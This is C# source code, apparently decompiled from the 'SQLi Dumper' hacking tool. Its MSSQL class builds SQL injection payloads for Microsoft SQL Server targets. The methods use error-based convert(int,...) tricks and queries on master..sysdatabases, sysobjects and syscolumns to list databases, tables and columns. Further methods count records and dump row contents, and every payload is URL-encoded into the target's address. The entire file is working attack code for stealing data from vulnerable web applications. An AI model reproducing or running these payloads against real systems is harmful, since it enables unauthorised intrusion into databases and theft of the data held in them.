// Decompiled with JetBrains decompiler
// Type: DataBase.MSSQL
// Assembly: SQLi Dumper, Version=8.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFDD07D3-5737-4188-BACA-DE2D004C7CCF
// Assembly location: C:\Users\cole\Desktop\SQLi Dumper v8.5 [VeryClean]\SQLi v.8.5 VeryClean by Stephanny.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System.Collections.Generic;

namespace DataBase
{
  public class MSSQL
  {
    private const string CODE_ERROR = "convert(int,(%K%+(#)+%K%))";
    private const string CODE_ERROR_COLLATE = "convert(int,(%K%+(#)+%K%) COLLATE SQL_Latin1_General_Cp1254_CS_AS)";

    private static string GetQuery(InjectionType oError, bool bCollateLatin)
    {
      if (oError != InjectionType.Error)
        return "(%K%+(#)+%K%)";
      return bCollateLatin ? "convert(int,(%K%+(#)+%K%) COLLATE SQL_Latin1_General_Cp1254_CS_AS)" : "convert(int,(%K%+(#)+%K%))";
    }

    public static string Info(
      string sTraject,
      InjectionType oError,
      bool bCollateLatin,
      List<string> lColumn,
      string sCastType,
      string sEndUrl = "")
    {
      string str1 = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), (object) "#", (object) ("cast(# as " + sCastType + ")")));
      string sqlChar1 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false);
      string sqlChar2 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false);
      string query = MSSQL.GetQuery(oError, bCollateLatin);
      string newValue1;
      if (lColumn.Count == 1)
      {
        newValue1 = str1.Replace("#", lColumn[0].Trim());
      }
      else
      {
        string str2 = "Select (";
        int num = checked (lColumn.Count - 1);
        int index = 0;
        while (index <= num)
        {
          if (index > 0)
            str2 = str2 + "+" + sqlChar2 + "+";
          string str3 = str1.Replace("#", lColumn[index].Trim());
          str2 += str3;
          checked { ++index; }
        }
        newValue1 = str2 + ") as t";
      }
      string sData = query.Replace("%K%", sqlChar1).Replace("#", newValue1);
      string newValue2 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue2) + sEndUrl;
    }

    public static string DataBases(
      string sTraject,
      InjectionType oError,
      bool bCorrentDb,
      string sCastType,
      bool bCollateLatin,
      int iDbId,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "")
    {
      string str1 = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), (object) "#", (object) ("cast(# as " + sCastType + ")")));
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false);
      string str2 = MSSQL.GetQuery(oError, bCollateLatin).Replace("%K%", sqlChar);
      string str3;
      if (bCorrentDb)
        str3 = str2.Replace("#", str1.Replace("#", "DB_NAME()"));
      else if (string.IsNullOrEmpty(sWhere))
      {
        str3 = str2.Replace("#", "select distinct top 1 # from [master]..[sysdatabases] where [dbid]=" + Conversions.ToString(checked (iDbId + 1)));
      }
      else
      {
        string newValue = "isnull(#,char(32))";
        string str4 = str1.Replace("#", newValue).Replace("#", "[name]");
        str3 = str2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("select top 1 " + str4 + " from (select top %INDEX% [name] from [master]..[sysdatabases] where " + sWhere), Interaction.IIf(!string.IsNullOrEmpty(sOrderBy), (object) (" order by " + sOrderBy + ", [name] asc"), (object) " order by [name] asc")), (object) ")"), (object) "sq order by [name] desc"))).Replace("%INDEX%", Conversions.ToString(checked (iDbId + 1)));
      }
      string sData = str3.Replace("#", str1.Replace("#", "[name]"));
      string newValue1 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue1) + sEndUrl;
    }

    public static string Tables(
      string sTraject,
      string sDataBase,
      InjectionType oError,
      string sCastType,
      bool bCollateLatin,
      int iIndex,
      int iAfectedRows = 0,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "")
    {
      string str = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), (object) "#", (object) ("cast(# as " + sCastType + ")")));
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false);
      string sData = MSSQL.GetQuery(oError, bCollateLatin).Replace("%K%", sqlChar).Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("select distinct top 1 # from [" + sDataBase + "]..[sysobjects] where id=(select top 1 id from (select distinct top " + Conversions.ToString(checked (iIndex + 1)) + " id from [" + sDataBase + "]..[sysobjects] where xtype=char(85) "), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) "order BY id ASC) "), (object) " sq order BY id DESC)"))).Replace("#", str.Replace("#", "[name]"));
      string newValue = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue) + sEndUrl;
    }

    public static string Columns(
      string sTraject,
      string sDataBase,
      string sTable,
      InjectionType oError,
      string sCastType,
      bool bCollateLatin,
      int iIndex,
      int iAfectedRows = 0,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "")
    {
      string str = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), (object) "#", (object) ("cast(# as " + sCastType + ")")));
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false);
      string sData = MSSQL.GetQuery(oError, bCollateLatin).Replace("%K%", sqlChar).Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("select distinct top 1 # from [" + sDataBase + "]..[syscolumns] where id=(select id from [" + sDataBase + "]..[sysobjects] where [name]=%TB%) and [name] not in (select distinct top %INDEX% [name] from [" + sDataBase + "]..[syscolumns] where id=(select top 1 id from [" + sDataBase + "]..[sysobjects] where [name]=%TB%"), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) ")"), (object) ")"))).Replace("%TB%", Globals.G_Utilities.ConvertTextToSQLChar(sTable, false)).Replace("%INDEX%", Conversions.ToString(iIndex)).Replace("#", str.Replace("#", "[name]"));
      string newValue = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue) + sEndUrl;
    }

    public static string Dump(
      string sTraject,
      string sDataBase,
      string sTable,
      List<string> lColumn,
      bool bIFNULL,
      InjectionType oError,
      string sCastType,
      bool bCollateLatin,
      int iIndex,
      int iAfectedRows = 0,
      string sWhere = "",
      string sOrderBy = "",
      string sEndurl = "",
      string sCustomQuery = "",
      int iMSQLErrCIndex = -1)
    {
      string str1 = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), (object) "#", (object) ("cast(# as " + sCastType + ")")));
      string str2 = Conversions.ToString(Interaction.IIf(true, (object) ("isnull(#,char(" + Conversions.ToString(32) + "))"), (object) "#"));
      string sqlChar1 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false);
      string sqlChar2 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false);
      string query = MSSQL.GetQuery(oError, bCollateLatin);
      string str3;
      if (string.IsNullOrEmpty(sCustomQuery))
      {
        string str4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "select top 1 %cs% from(select top [x] %cl% from [%db%]..[%tb%] ", Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) ("where " + sWhere + " "))), (object) "order by %cs2% asc"), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) ("," + sOrderBy))), (object) ") "), (object) "sq order by %cs2% desc"));
        if (string.IsNullOrEmpty(sDataBase))
          str4 = str4.Replace("[%db%]..", "");
        string newValue1 = "";
        string newValue2 = "";
        string str5 = str4.Replace("%cs2%", "[" + lColumn[0].Trim() + "]");
        string str6;
        if (lColumn.Count == 1)
        {
          str6 = str5.Replace("%cs%", str2.Replace("#", "[" + lColumn[0].Trim() + "]")).Replace("%cl%", str2.Replace("#", "[" + lColumn[0].Trim() + "]"));
        }
        else
        {
          int num = checked (lColumn.Count - 1);
          int index = 0;
          while (index <= num)
          {
            if (index > 0)
              newValue1 = newValue1 + "+" + sqlChar2 + "+";
            if (index > 0)
              newValue2 += ",";
            if (index == iMSQLErrCIndex)
            {
              str5 = str5.Replace("%cs%", str2.Replace("#", str1.Replace("#", "[" + lColumn[index].Trim() + "]")));
              newValue1 = newValue1 + "[" + lColumn[index].Trim() + "]";
            }
            else
              newValue1 += str1.Replace("#", str2.Replace("#", str1.Replace("#", "[" + lColumn[index].Trim() + "]")));
            newValue2 = newValue2 + "[" + lColumn[index].Trim() + "]";
            checked { ++index; }
          }
          str6 = str5.Replace("%cs%", newValue1);
        }
        string newValue3 = str6.Replace("%cl%", newValue2);
        str3 = query.Replace("#", newValue3);
      }
      else
        str3 = query.Replace("#", sCustomQuery);
      string sData = str3.Replace("%db%", sDataBase).Replace("%tb%", sTable).Replace("[s]", sqlChar2).Replace("[x]", Conversions.ToString(checked (iIndex + 1))).Replace("%K%", sqlChar1);
      string newValue = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue) + sEndurl;
    }

    public static string Count(
      string sTraject,
      InjectionType oError,
      string sCastType,
      bool bCollateLatin,
      Schema o,
      string sDataBase,
      string sTable,
      string sWhere = "",
      string sEndUrl = "")
    {
      Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), (object) "#", (object) ("cast(# as " + sCastType + ")")));
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false);
      Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false);
      string str = MSSQL.GetQuery(oError, bCollateLatin);
      switch (o)
      {
        case Schema.DATABASES:
          str = str.Replace("#", Conversions.ToString(Operators.ConcatenateObject((object) "select top 1 # from [master]..[sysdatabases]", Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" where " + sWhere)))));
          break;
        case Schema.TABLES:
          str = str.Replace("#", Conversions.ToString(Operators.ConcatenateObject((object) ("select top 1 # from [" + sDataBase + "]..[sysobjects] where xtype=char(85)"), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere)))));
          break;
        case Schema.COLUMNS:
          str = str.Replace("#", Conversions.ToString(Operators.ConcatenateObject((object) ("select top 1 # from [" + sDataBase + "]..[syscolumns] where id=(select id from  [" + sDataBase + "]..[sysobjects] where [name]=" + Globals.G_Utilities.ConvertTextToSQLChar(sTable, false) + ")"), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere)))));
          break;
        case Schema.ROWS:
          str = str.Replace("#", Conversions.ToString(Operators.ConcatenateObject((object) ("select top 1 # from [" + sDataBase + "]..[" + sTable + "] "), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) ("where " + sWhere)))));
          break;
      }
      string sData = str.Replace("#", "cast(count(*) as char)").Replace("%K%", sqlChar);
      string newValue = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue) + sEndUrl;
    }
  }
}
